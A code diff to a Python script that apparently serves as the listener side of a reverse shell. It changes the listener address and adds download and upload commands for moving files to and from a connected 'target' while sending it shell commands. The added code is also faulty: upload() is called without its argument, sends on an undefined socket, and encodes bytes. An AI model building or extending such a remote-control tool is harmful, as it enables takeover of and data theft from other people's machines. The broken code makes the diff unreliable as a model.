@@ -1,7 +1,18 @@
 import socket
 
-listener_ip = '192.168.1.148'
+listener_ip = '192.168.0.108'
 listener_port = 6996
+
+def download():
+    file_recv = open('file_download/file_download.txt','wb')
+    data_recv = target.recv(2048)
+    file_recv.write(data_recv)
+    file_recv.close()
+
+def upload(file_name):
+    file_upload = open(file_name, 'rb')
+    data_to_send = file_upload.read()
+    sock.send(data_to_send.encode())
 
 def shell_command():
     while True:
@@ -15,6 +26,17 @@ def shell_command():
             continue
         elif command[:5] == 'mkdir' and len(command) > 1:
             continue
+        elif command[:8] == 'download' and len(command) > 1:
+            try:
+                download()
+            except:
+                continue
+
+        elif command[:6] == 'upload' and len(command) > 1:
+            try:
+                upload()
+            except:
+                continue
         else:
             result = target.recv(2048)
             result = result.decode()
